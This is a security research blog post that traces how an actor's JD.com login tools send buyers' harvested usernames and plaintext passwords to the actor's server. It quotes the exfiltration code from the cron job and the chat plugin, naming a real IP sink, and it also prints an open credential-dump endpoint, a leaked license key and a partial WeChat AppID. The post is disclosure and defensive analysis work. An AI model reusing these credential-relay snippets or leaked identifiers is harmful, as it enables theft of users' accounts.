---
layout: post
category: Security
title: "Farming the farmers: smallfawn's JD login tool routes harvested credentials to their own server"
heading: "Farming the farmers: smallfawn's JD login tool routes harvested credentials to their own server"
description: "smallfawn sells JD.com login tools to other reward-farmers. By design, the buyer cannot log a victim in without calling smallfawn's own server, and the plaintext passwords are relayed there three times a day. Source-verified at file:line, with the git history that proves the server is real."
---

## TLDR:

- smallfawn is one of the more advanced actors in this whole scene: 152 repos,
  a 3,176-star script collection, and `decode_action`, the JS deobfuscator most
  of the ecosystem relies on. This post is about the product they sell that
  steals teh credentials from the people who buy it.
- They sell two "JD account and password login" tools to other reward farmers.
  One of them, `JDLogin-Client`, cannot log a victim into JD without first
  calling smallfawn's own server, and it relays the harvested credentials
  straight back to them. They farm the farmers.
- The password harvesting server is at `8.141.174.247:3000`. Every enrolled
  account's JD username and plaintext password are sent there in a GET query
  string by the auto-renewal cron, three times a day (`cron.js:54`).
- Precise scope, because it matters: the interactive login path forwards the
  username only (`express.js:41`). The plaintext password reaches smallfawn
  through the cron job flow and through the default chat plugin, not on every
  login.
- The second tool, dingdingdang, does not phone home to smallfawn. Its problem
  is local: a plaintext credential store and a `/get?k=` endpoint that dumps
  every account and password to anyone holding one shared key, documented in
  the README as a feature.
- Collateral damage: a third party's live secret is sitting in the tree. GAC
  Motor's (广汽) WeChat AppSecret (`f7b821...`) was committed in 2024 and never
  removed, enough to mint WeChat OAuth tokens against GAC Motor's own users.
- In fairness on timing: this tooling is dormant. `JDLogin-Client`,
  `dingdingdang`, and `WoolWeb` haven't been touched since late 2024. smallfawn
  is still active in the scene, but development on these JD-login tools stopped
  then, and I did not probe the backend to confirm it still collects today.
- If you ran a 京东账密登录 / 路灯 / 鹿登 login bot, treat your JD password as
  compromised and rotate it now.

---

## Terms in this post

If you landed here mid-series, a quick orientation. The hub has the full glossary.

- **JD / 京东** is JD.com, one of China's largest e commerce platforms. Think
  Amazon of China. This is what was targeted.
- **CK / cookie** is a captured app session credential. The unit reward-farmers
  trade and resell. How exactly they get these I think is another story.
- **h5st** is JD's client side anti fraud request signature. You cannot
  complete a JD login without a valid one, and that is the lever this whole
  product turns on.
- **AppID / AppSecret** are a WeChat mini-program's server credentials. The
  leaked GAC Motor pair is one of these.
- **cron** is a scheduled task runner. Here it is the thing that fires the
  password leak three times a day. The wool crew uses Qinglong as a web ui for
  this sort of thing.
- **vm2** is a Node sandbox library. The version bundled in smallfawn's tooling
  carries CVE-2023-29017, a known sandbox escape.

---

## Background: the most capable person in the room

Most of the actors in this scene are copying each other. Same apps, same
scripts, the odd file lifted word for word from the next account over. Same
targets. smallfawn is the exception. Of their 152 repos, 130 are forks, but the
22 original ones are the load-bearing parts of the whole ecosystem: a
133-script farming collection (`QLScriptPublic`, 3,176 stars, every script
CI-verified), a complete Go WeChat protocol server, and `decode_action`, the
JavaScript deobfuscator with over 1,300 forks that half the scene uses to
un hide each other's scripts.

The person who wrote the tool everybody uses to make hidden code readable also
runs a covert credential harvesting campaign. They are, by some distance, the most
technically capable actor I found on the public GitHub accounts. That is
exactly what makes the next part worth writing down.

They are not shy about the infra, either. Three of their chatbot plugins poll a
printer over SNMP, watch a UPS over NUT (Network UPS Tools), and update
Cloudflare DNS with IP changes. This is a person running physical, co-located
infrastructure, not a kid with a free-tier VM.

One thing up front, so it does not get muddled with the last post: smallfawn
has nothing to do with the wyourname wool DRM. Their scripts ship as plaintext,
no loader, no C2-held key, no encryption to crack. Different operator,
different model. They just happen to be in the same scene.

---

## Two products, two trust models

smallfawn sells JD logins under "京东账密登录协议版本", and the shop and demo
hostnames are baked into the source: `smshop.back1.idcfengye.com` and
`smjd.back1.idcfengye.com`. Neither is smallfawn's own server: both are
subdomains on idcfengye, a third-party reverse-tunnel (内网穿透) service in the
Sunny-Ngrok family (run by 深圳猿类科技有限公司, filing 粤ICP备14050499号) —
basically a Chinese ngrok-style service, one of several. smallfawn is just a
tenant, so the hostnames only point at their box while their tunnel client is
connected, which it wasn't when I looked: either their tunnel was down, or this
is dead infra.

| Product | Language / port | Login method | Where the credentials go | Risk |
|---|---|---|---|---|
| **JDLogin-Client** | Node / 3000 | Direct JD API (`plogin.m.jd.com`) | smallfawn's servers: mandatory session-param server, cron password leak, default plugin host | supply chain theft |
| **dingdingdang** | Python (Quart) / 12345 | Local headless Chromium | Local `data.json`, exposed through an open `/get?k=` | High, local plaintext store and weak-key dump |

The rest of this post is mostly about the first one. The second one is a real
exposure, but it is just a shoddy code cleanlyness and defaults problem. The
first one is a design.

---

## Pillar A: JDLogin-Client routes credentials to smallfawn

### You cannot log in without smallfawn's server

`server/config.json:3` ships with the real default already filled in:

```json
{ "key": "卡密", "server": "http://8.141.174.247:3000", "cron": "0 25 20,23,2 * * *" }
```

The actual POST to JD.com (`server/login.js:16-49`) needs a pile of anti-fraud
session parameters: `guid`, `lsid`, `lstoken`, `verifytoken`, the `h5st`
signature, and the `risk_jd` bundle of `eid`, `fp`, `token`, `jstub`. None of
that is generated on the buyer's box. It is fetched from `8.141.174.247:3000`
over `/get` (`express.js:52`, `cron.js:59`), and the license key (`卡密`)
authenticates the buyer to that server (`express.js:95-103`). So the main anti
fraud breaking software, is hidden behind smallfawn's servers.

That is the lock. Without smallfawn's server vending the `h5st` and risk
tokens, the login cannot clear JD's risk control, so it cannot complete at all.
Every operator who buys this tool is wired into smallfawn's infrastructure just
to function. But note what actually has to cross their server: the username. The
`/get` that vends the tokens is username-only (`cron.js:59`; the interactive
`/api/set` is too, `express.js:41`). The password is never required to mint the
anti-fraud tokens — the tool works fine with username-only vending — so its
appearance in the cron `/set` (next section) isn't a technical necessity. It's
harvesting.

### The cron path leaks plaintext passwords, three times a day

`server/cron.js:53-54` renews expired `JD_COOKIE`s on a schedule, and it does
it like this:

```javascript
async function getJDCookies(username, password, remark='无备注') {
    let { data: result } = await axios.get(config.server + '/set?key=' + config.key
        + '&username=' + username + '&password=' + password)   // -> 8.141.174.247:3000
```

The `username` and the plaintext `password` are read out of the local
`user.json` (stored at login by `login.js:54-60`) and sent in the query string
to `8.141.174.247:3000`. The cron is `0 25 20,23,2 * * *`, Asia/Shanghai, so
this fires at 20:25, 23:25, and 02:25 every day, for every account the operator
has enrolled. Not the cookie. The phone number and the password, in cleartext,
in a URL. I think the timing on these things must have something to do with how
long the tokens are valid for after minting them.

### The default chat plugin sends end-user creds to smallfawn's demo host

There is a third path, and it is the one that reaches all the way down to the
end user. The shipped chat plugin, `ludeng.js` (路灯, "street lamp," the bot
trigger users type), defaults its API host to smallfawn's demo box:

```javascript
let YourSMJDAPIUrl = 'http://smjd.back1.idcfengye.com'   // smallfawn's host, the default
...
await axios.get(YourSMJDAPIUrl + '/api/get?username=' + ... + '&password=' + encodeURIComponent(password) + ...)
```

Unless the operator edits that line, every user who types their JD phone and
password into the bot sends both, in the clear, straight to
`smjd.back1.idcfengye.com`. I am guessing most operators will not edit it. It
works out of the box, which is the point. Also it seems that a lot of the wool
community just relies on others creating good scripts, and they may not even
read them, if they did this sort of thing would not fly.

---

## Pillar B: dingdingdang keeps it local, and leaves the door open

The second product is fairer to smallfawn as this does not appear to have
malicious intent, but still bad for everyone who runs it.

dingdingdang logs in with a local headless Chromium browser (`login.py`), and
its plugins default to `127.0.0.1:12345` (`GoDongGoCar_update.js:4`,
`sillygirl.js:12` these names are fun). There is no `8.141.174.247` in the
loop. It does not phone home to smallfawn. I want to be clear about that,
because when I first saw this I just assumed that this was in the same class as
the jd.com credential theft, however that was lazy of me. I dont want you to
make the same mistake as me. Trust your intuition, but always validate.

What it does instead is keep a plaintext credential store and then publish a
key to it. `docker/api.py:169-185` writes each account to a volume-mounted
`data.json`:

```python
account_data = { "account": ..., "password": workList[uid].password, "ptpin": ..., "remarks": ..., "wxpusherUid": "" }
```

`password` is plaintext. And `docker/api.py:289-305` hands the whole file back
to anyone with one shared key:

```python
@app.route("/get")
async def get_data():
    if request.args.get("k") == config["key"]:
        return jsonify(load_from_file("data.json"))   # the entire plaintext store
```

One key, no rate limit, no per-user scoping. Guess or leak the key once and you
have every enrolled account, password, and `ptpin` in the store. This is not a
bug they overlooked. The README lists it as a feature: `获取账密 备注 ptpin信息
/get?k=密钥`, "fetch account-password, remarks, and ptpin info." The
recommendation is a 16-character key "to protect your account and password
information." There is no server-side enforcement of that, of course.

---

## The git history that proves the server is real

A skeptical reader should be asking whether `8.141.174.247:3000` is a real
backend or a placeholder somebody forgot to fill in. The git history settles
it, and it does so because smallfawn made the same mistake everyone in this
scene makes.

The first commit of JDLogin-Client, `9df41a2` on 10 November 2024, shipped
`config.json` with a real license key in place:

```json
{ "key": "HASL1", "server": "http://8.141.174.247:3000" }
```

The next day, commit `e98c5aa`, both were scrubbed to placeholders (`KEY`,
`APIURL`). The day after that, commit `fd5c0df`, the server address was quietly
added back while the key stayed as `卡密` (Access Code). You do not scrub, then
re-add a placeholder. `HASL1` was a working shared secret that sat in public for
about a day, and the IP it sat next to is the real backend.

That scrub is also a preview of the next post in this series. Everyone here
scrubs git history, smallfawn, qltrojan, leafTheFish, all of them, usually with
the same orphan branch trick (I will write up how this works at some point).
The scrub is meant to remove the evidence. More often it marks exactly where
the evidence was. Also things can be missed when doing this.

---

## Collateral: a third party's WeChat keys

The blast radius is not limited to JD. While reading the WoolWeb panel I found
`server/data_gac.json`, committed once on 9 October 2024 (`783550a`) and never
touched again. It holds a live credential set for a company that has nothing to
do with any of this: GAC Motor (广汽), the car manufacturer.

- WeChat AppID `wx55d651b24ca783fa`
- WeChat AppSecret `f7b821...` (redacted here)
- a full `accessToken` and `sdkTicket`, both now stale

The tokens expire. The AppSecret does not. As long as it stands, anyone who can
read this file can mint fresh WeChat OAuth tokens against GAC Motor's
mini program and impersonate the users who authenticated through it. That is a
clean third-party disclosure item, unrelated to the JD pipeline, sitting in a
public repo since 2024.

---

## The wider arsenal

This is not the whole operation, it is one corner of it. A quick look at the
rest, because each one rounds out the picture of what this operator can do.

- **docker-wx** is a complete Go implementation of the WeChat iPad protocol,
  145 API endpoints, bundled with the `855协议.zip` protocol source and stamped
  `仅限集团内部使用,请勿对外`, "internal use only, do not expose." It is a full
  WeChat account-takeover server.
- **rs-reverse** is a 26 MB, 3,450-file framework for bypassing Ruishu
  (瑞数), the VMP (Virtual Machine Protection) based bot detection that guards
  China Telecom and a lot of banks. This is professional reverse engineering
  work.
- **XianYuApis** reverses the full Goofish (闲鱼) marketplace API and bolts a
  WebSocket auto-reply bot onto it, so farmed goods can be listed and
  haggled over at scale with no human in the loop.
- **VirtualApp** is the device ID rotation layer: run many instances of one
  app, each with a different fake device fingerprint, to beat the single-device
  limits farming runs into. Think of this as using a tonne of valid user
  agents.
- **decode_action**, the deobfuscator the whole scene depends on, ships
  `vm2@^3.9.11` as a dependency, and that version carries
  CVE-2023-29017, a sandbox escape. The directional risk is real: run
  `decode_action` on a malicious obfuscated script and that escape is in play —
  the deobfuscator the whole scene trusts is itself an attack surface. I'm not
  asserting smallfawn did this on purpose; the exposure stands either way.

The basic flow: reverse the protections, sign the requests, rotate the
devices, automate the chat, sell the goods. That is an integrated fraud
platform, and the JD login tool is the part that also taxes its own users.

---

## The limits of my engagement, and this report.

The honest limits, because they matter more here than usual.

All of this code has been dormant since 2024, smallfawn is still active in the
scene, but work on these tools stopped at the end of 2024.

Everything above is read out of public source at file and line. I did not send
anything to `8.141.174.247:3000`, I did not probe it, and I did not watch a
single packet leave a real install. Naming a sink is not the same as
poking it, and I stayed on the safe side of that line. The claim "smallfawn
receives the credentials" is an inference from explicit code paths, the GET to
their server is right there in `cron.js:54`, but I am inferring the server stores
what it is handed, not proving it from traffic.

And I do not know who smallfawn is. The handle, the repos, the QQ group, the
shop, those are real and public. The person behind them is unconfirmed, and
this post does not try to change that. I am reporting a mechanism and a
sink, not a name.

---

## Disclosure

This one has real victims and a credential sink, so it went to the vendors first:
reported to JD.com and GAC Motor on 24 June 2026, ahead of publication.

- **JD.com security.** `8.141.174.247:3000` is a credential relay tied to
  automation against `plogin.m.jd.com/cgi-bin/mm/domlogin`. The abuse primitive
  worth their attention is the `h5st` and risk-token vending, that is the thing
  that lets a third party clear JD's risk control on behalf of a paying
  operator base.
- **GAC Motor (广汽).** Rotate WeChat AppSecret `f7b821...`. It has been public
  in `WoolWeb/server/data_gac.json` since October 2024 and is enough to
  impersonate their WeChat users.
- **End users.** Anyone who used a 京东账密登录, 路灯, or 鹿登 login bot should
  treat their JD password as compromised and rotate it.

---

## IOCs

The GAC AppSecret is redacted until it is confirmed rotated. Everything else is
smallfawn's own infrastructure.

| Indicator | Role | Evidence |
|---|---|---|
| `8.141.174.247:3000` | session-param server and plaintext-password sink | `config.json:3`, `cron.js:54`, `express.js:52,101` |
| `smjd.back1.idcfengye.com` | demo host, default sink for the `ludeng.js` plugin | `ludeng.js:14,40` |
| `smshop.back1.idcfengye.com` | commercial purchase portal | READMEs |
| `:12345/get?k=<key>` | dingdingdang open plaintext-store dump | `api.py:289-305`, `README:54` |
| `0 25 20,23,2 * * *` (Asia/Shanghai) | 3x/day password-exfil cadence (20:25 / 23:25 / 02:25) | `config.json`, `express.js:121-134` |
| `f7b821...` | GAC Motor WeChat AppSecret, hardcoded, not yet rotated | `WoolWeb/server/data_gac.json` |
| `registry.cn-hangzhou.aliyuncs.com/smallfawn/linux_amd64_ddd` | dingdingdang Docker image (x86_64) | dingdingdang README |
| `registry.cn-hangzhou.aliyuncs.com/smallfawn/linux_arm64_ddd` | dingdingdang Docker image (ARM64) | dingdingdang README |
| `HASL1` | leaked JDLogin-Client license key (2024-11-10, scrubbed next day) | `config.json` history `9df41a2` |
